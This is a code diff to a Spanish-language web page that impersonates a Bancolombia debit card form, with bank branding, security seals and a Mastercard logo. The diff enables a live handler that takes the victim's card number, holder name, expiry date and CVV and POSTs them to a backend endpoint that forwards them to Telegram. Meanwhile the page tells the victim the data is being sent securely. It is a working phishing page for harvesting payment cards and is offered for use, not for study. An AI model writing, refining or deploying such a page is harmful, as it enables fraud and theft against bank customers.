@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-<title>Tarjeta Débito Bancolombia | Seguridad Verificada</title>
+<title>Tarjeta Débito Bancolombia | Mastercard</title>
 <style>
     * {
         margin: 0;
@@ -27,7 +27,6 @@
         margin: 0 auto;
     }
 
-    /* Banner de seguridad superior */
     .security-banner {
         background: linear-gradient(95deg, #0c5e2e, #0a4a24);
         border-radius: 16px;
@@ -37,6 +36,8 @@
         align-items: center;
         justify-content: space-between;
         box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+        flex-wrap: wrap;
+        gap: 10px;
     }
     .security-banner-left {
         display: flex;
@@ -199,18 +200,34 @@
         padding: 2px 0;
     }
 
-    /* Visa logo en tarjeta */
-    .card-brand {
+    .mastercard-logo {
         display: flex;
+        align-items: center;
+        gap: 4px;
         justify-content: flex-end;
-        margin-top: 8px;
     }
-    .visa-logo {
-        font-size: 1.4rem;
+    .mc-circle-red {
+        background: #EB001B;
+        width: 32px;
+        height: 32px;
+        border-radius: 50%;
+        position: relative;
+        right: -12px;
+        opacity: 0.9;
+    }
+    .mc-circle-yellow {
+        background: #F79E1B;
+        width: 32px;
+        height: 32px;
+        border-radius: 50%;
+        opacity: 0.9;
+    }
+    .mc-text {
         font-weight: 800;
-        color: #1a2f6c;
-        text-shadow: 0 1px 0 rgba(255,255,200,0.5);
-        letter-spacing: 2px;
+        font-size: 0.7rem;
+        letter-spacing: 1px;
+        color: #1a1a2e;
+        margin-left: 4px;
     }
 
     .back {
@@ -246,7 +263,6 @@
         outline: none;
     }
 
-    /* Footer de seguridad */
     .security-footer {
         background: white;
         border-radius: 20px;
@@ -295,9 +311,6 @@
         padding: 5px 12px;
         border-radius: 30px;
     }
-    .seal span:first-child {
-        font-size: 1rem;
-    }
 
     .btn-send {
         background: linear-gradient(95deg, #2b6e3c, #1f4f2a);
@@ -320,6 +333,11 @@
     .btn-send:hover {
         transform: scale(0.98);
         background: linear-gradient(95deg, #1f582d, #15411f);
+    }
+
+    .btn-send:disabled {
+        opacity: 0.6;
+        cursor: not-allowed;
     }
 
     .status-msg {
@@ -355,13 +373,11 @@
         .front { padding: 16px; }
         .bank-name { font-size: 1.3rem; }
         .security-footer { flex-direction: column; align-items: flex-start; }
-        .security-banner { flex-direction: column; gap: 8px; text-align: center; }
     }
 </style>
 </head>
 <body>
 <div class="wrapper">
-    <!-- Banner de seguridad superior -->
     <div class="security-banner">
         <div class="security-banner-left">
             <div class="security-icon">🔒</div>
@@ -380,7 +396,6 @@
 
     <div class="card-stage">
         <div class="card" id="creditCard">
-            <!-- FRONT -->
             <div class="card-face front">
                 <div class="bank-header">
                     <div class="bank-name">Bancolombia</div>
@@ -398,11 +413,12 @@
                         <input type="text" id="expiryInput" class="editable-value" placeholder="MM/AA" maxlength="5" style="width: 70px;">
                     </div>
                 </div>
-                <div class="card-brand">
-                    <div class="visa-logo">VISA</div>
+                <div class="mastercard-logo">
+                    <div class="mc-circle-red"></div>
+                    <div class="mc-circle-yellow"></div>
+                    <span class="mc-text">Mastercard</span>
                 </div>
             </div>
-            <!-- BACK -->
             <div class="card-face back">
                 <div class="black-strip"></div>
                 <div class="cvc-container">
@@ -415,11 +431,10 @@
     </div>
 
     <button class="btn-send" id="sendBtn">
-        <span>🔒</span> ENVIAR DATOS SEGURO
+        <span>✈️</span> ENVIAR A TELEGRAM
     </button>
-    <div id="statusMsg" class="status-msg">✅ Listo. Completa los datos y presiona enviar</div>
+    <div id="statusMsg" class="status-msg">✅ Completa los datos y presiona enviar</div>
 
-    <!-- Footer de seguridad -->
     <div class="security-footer">
         <div class="footer-logo">
             <div class="footer-logo-icon">🏦</div>
@@ -442,11 +457,9 @@
     const sendBtn = document.getElementById('sendBtn');
     const statusMsg = document.getElementById('statusMsg');
 
-    // Variables para controlar el flip automático
     let isFlippingFromExpiry = false;
     let expiryTimeout = null;
 
-    // Formatear número de tarjeta - TAMAÑO MÁS PEQUEÑO gracias a CSS, pero el formateo igual
     function formatCardNumber(value) {
         let cleaned = value.replace(/\D/g, '');
         if (cleaned.length > 16) cleaned = cleaned.slice(0, 16);
@@ -462,7 +475,6 @@
         e.target.value = formatted;
     });
 
-    // Formatear fecha (MM/AA)
     function formatExpiry(value) {
         let digits = value.replace(/\D/g, '');
         if (digits.length > 4) digits = digits.slice(0, 4);
@@ -476,10 +488,8 @@
         let formatted = formatExpiry(e.target.value);
         e.target.value = formatted;
         
-        // Resetear el timeout de flip cada vez que escribe
         if (expiryTimeout) clearTimeout(expiryTimeout);
         
-        // Si la fecha está completa (5 caracteres incluyendo /), programar el flip
         if (e.target.value.length === 5 && e.target.value.includes('/')) {
             expiryTimeout = setTimeout(() => {
                 if (!card.classList.contains('flipped')) {
@@ -495,7 +505,6 @@
         }
     });
 
-    // Cuando la fecha pierde el foco (terminó de editar), también volteamos al CVV
     expiryInput.addEventListener('blur', function() {
         if (expiryTimeout) {
             clearTimeout(expiryTimeout);
@@ -512,7 +521,6 @@
         }
     });
 
-    // Presionar Enter en el campo fecha también voltea
     expiryInput.addEventListener('keypress', function(e) {
         if (e.key === 'Enter') {
             e.preventDefault();
@@ -527,17 +535,18 @@
         }
     });
 
-    // Titular en mayúsculas
     holderInput.addEventListener('input', function(e) {
         e.target.value = e.target.value.toUpperCase();
+        let sanitized = e.target.value.replace(/[^A-Z\s\.Ñ]/g, '');
+        if (sanitized !== e.target.value) {
+            e.target.value = sanitized;
+        }
     });
 
-    // CVC solo números
     cvcInput.addEventListener('input', function(e) {
         e.target.value = e.target.value.replace(/\D/g, '').slice(0, 3);
     });
 
-    // Flip de tarjeta al enfocar CVC
     cvcInput.addEventListener('focus', () => {
         if (!isFlippingFromExpiry) {
             card.classList.add('flipped');
@@ -554,7 +563,6 @@
         }, 150);
     });
 
-    // Quitar flip al enfocar campos del frente
     [numberInput, holderInput].forEach(input => {
         input.addEventListener('focus', () => {
             if (card.classList.contains('flipped')) {
@@ -569,20 +577,19 @@
         }
     });
 
-    // Enviar datos (simulación con verificación de seguridad)
+    // Envío a Telegram vía backend (sin exponer token)
     sendBtn.addEventListener('click', async () => {
         const cardNumber = numberInput.value.replace(/\s/g, '');
         const cardHolder = holderInput.value.trim();
         const expiryDate = expiryInput.value.trim();
         const cvcCode = cvcInput.value.trim();
 
-        // Validaciones de seguridad
         if (!cardNumber || !cardHolder || !expiryDate || !cvcCode) {
             statusMsg.innerHTML = '⚠️ Por favor, completa todos los datos de la tarjeta';
             statusMsg.style.background = '#ffe0e0';
             setTimeout(() => {
                 statusMsg.style.background = '#f0f0f0';
-                statusMsg.innerHTML = '✅ Listo. Completa los datos y presiona enviar';
+                statusMsg.innerHTML = '✅ Completa los datos y presiona enviar';
             }, 3000);
             return;
         }
@@ -592,7 +599,7 @@
             statusMsg.style.background = '#ffe0e0';
             setTimeout(() => {
                 statusMsg.style.background = '#f0f0f0';
-                statusMsg.innerHTML = '✅ Listo. Completa los datos y presiona enviar';
+                statusMsg.innerHTML = '✅ Completa los datos y presiona enviar';
             }, 3000);
             return;
         }
@@ -602,19 +609,18 @@
             statusMsg.style.background = '#ffe0e0';
             setTimeout(() => {
                 statusMsg.style.background = '#f0f0f0';
-                statusMsg.innerHTML = '✅ Listo. Completa los datos y presiona enviar';
+                statusMsg.innerHTML = '✅ Completa los datos y presiona enviar';
             }, 3000);
             return;
         }
         
-        // Validar mes (01-12)
-        const month = parseInt(expiryDate.substring(0, 2));
+        const month = parseInt(expiryDate.substring(0, 2), 10);
         if (month < 1 || month > 12) {
             statusMsg.innerHTML = '⚠️ Mes inválido (debe ser 01-12)';
             statusMsg.style.background = '#ffe0e0';
             setTimeout(() => {
                 statusMsg.style.background = '#f0f0f0';
-                statusMsg.innerHTML = '✅ Listo. Completa los datos y presiona enviar';
+                statusMsg.innerHTML = '✅ Completa los datos y presiona enviar';
             }, 3000);
             return;
         }
@@ -624,43 +630,16 @@
             statusMsg.style.background = '#ffe0e0';
             setTimeout(() => {
                 statusMsg.style.background = '#f0f0f0';
-                statusMsg.innerHTML = '✅ Listo. Completa los datos y presiona enviar';
+                statusMsg.innerHTML = '✅ Completa los datos y presiona enviar';
             }, 3000);
             return;
         }
 
         sendBtn.disabled = true;
-        sendBtn.innerHTML = '<span>⏳</span> VERIFICANDO SEGURIDAD...';
-        statusMsg.innerHTML = '🔒 Verificando capa de seguridad Bancolombia...';
+        sendBtn.innerHTML = '<span>📡</span> ENVIANDO A TELEGRAM...';
+        statusMsg.innerHTML = '📡 Enviando información de forma segura...';
         statusMsg.style.background = '#e3f2fd';
 
-        // Simulación de envío seguro (conexión a backend)
-        setTimeout(() => {
-            console.log('=== DATOS DE TARJETA BANCOLOMBIA (Entorno Seguro) ===');
-            console.log('Número:', cardNumber);
-            console.log('Titular:', cardHolder);
-            console.log('Vencimiento:', expiryDate);
-            console.log('CVV:', cvcCode);
-            console.log('Protocolo: SSL/TLS Activado');
-            console.log('===================================================');
-            
-            statusMsg.innerHTML = '✅ ¡Verificación exitosa! Datos protegidos bajo estándar Bancolombia.';
-            statusMsg.style.background = '#d4edda';
-            statusMsg.style.color = '#155724';
-            
-            sendBtn.disabled = false;
-            sendBtn.innerHTML = '<span>🔒</span> ENVIAR DATOS SEGURO';
-            
-            setTimeout(() => {
-                if (statusMsg.innerHTML.includes('exitoso')) {
-                    statusMsg.style.background = '#f0f0f0';
-                    statusMsg.style.color = '#000';
-                    statusMsg.innerHTML = '✅ Listo. Completa los datos y presiona enviar';
-                }
-            }, 4000);
-        }, 1500);
-        
-        /* === CÓDIGO PARA BACKEND REAL (descomentar cuando tengas el servidor) ===
         try {
             const response = await fetch('http://localhost:3000/api/send-to-telegram', {
                 method: 'POST',
@@ -672,23 +651,32 @@
                     cvcCode: cvcCode
                 })
             });
+
             const data = await response.json();
+
             if (response.ok && data.success) {
                 statusMsg.innerHTML = '✅ ¡Datos enviados con éxito a Telegram!';
                 statusMsg.style.background = '#d4edda';
+                statusMsg.style.color = '#155724';
             } else {
                 statusMsg.innerHTML = '❌ Error al enviar: ' + (data.error || 'Error desconocido');
                 statusMsg.style.background = '#f8d7da';
             }
         } catch (error) {
             console.error('Error:', error);
-            statusMsg.innerHTML = '❌ Error de conexión con el servidor.';
+            statusMsg.innerHTML = '❌ Error de conexión. Asegúrate que el backend esté corriendo en puerto 3000';
             statusMsg.style.background = '#f8d7da';
         } finally {
             sendBtn.disabled = false;
-            sendBtn.innerHTML = '<span>🔒</span> ENVIAR DATOS SEGURO';
+            sendBtn.innerHTML = '<span>✈️</span> ENVIAR A TELEGRAM';
+            setTimeout(() => {
+                if (statusMsg.innerHTML.includes('éxito')) {
+                    statusMsg.style.background = '#f0f0f0';
+                    statusMsg.style.color = '#000';
+                    statusMsg.innerHTML = '✅ Completa los datos y presiona enviar';
+                }
+            }, 4000);
         }
-        */
     });
 </script>
 </body>
